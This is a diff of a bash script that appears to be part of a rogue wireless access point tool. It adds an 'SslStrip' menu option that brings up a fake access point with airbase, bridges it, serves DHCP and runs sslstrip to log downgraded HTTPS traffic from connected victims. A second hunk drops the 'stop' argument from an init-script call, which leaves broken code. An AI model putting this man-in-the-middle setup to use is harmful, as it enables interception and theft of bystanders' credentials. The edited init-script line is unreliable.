@@ -226,7 +226,7 @@ openrc_bridge()
     # OpenRC needs sym links to bring the interface up. Verify they exist as needed if not make them then set proper state
     if [[ -e /etc/init.d/net.$BRIDGE ]]; then
         get_RCstatus "$BRIDGE"
-        [[ $STATUS == 'started' ]] && /etc/init.d/net.$BRIDGE stop; sleep 1; ip link set $BRIDGE down
+        [[ $STATUS == 'started' ]] && /etc/init.d/net.$BRIDGE; sleep 1; ip link set $BRIDGE down
     else
         ln -s /etc/init.d/net.lo /etc/init.d/net.$BRIDGE
     fi
@@ -315,7 +315,17 @@ menu()
     fi
     
     if [[ $MENUCHOICE == 1 ]]; then
-        startairbase; fbridge; dhcp; keepalive
+        get_name "ATTACK="; ATTACK=$USE
+        if [[ $ATTACK != "SslStrip" && $ATTACK != "WPS" ]]; then
+            startairbase; fbridge; dhcp; keepalive
+        elif [[ $ATTACK == "SslStrip" ]]; then
+            startairbase; fbridge; dhcp
+            echo -e "SSL Strip Log File\n" > ${sessionfolder}/ssl.log
+            sudo xterm -T "SSL Strip" -geometry 50x5 -e sslstrip -p -k -f lock.ico -w ${sessionfolder}/ssl.log &>/dev/null &
+            keepalive
+        else
+            echo "Bad attack method specified for this option."
+        fi
     elif [[ MENUCHOICE == 2 ]]; then
         echo "Option Available Next Release"
     else 
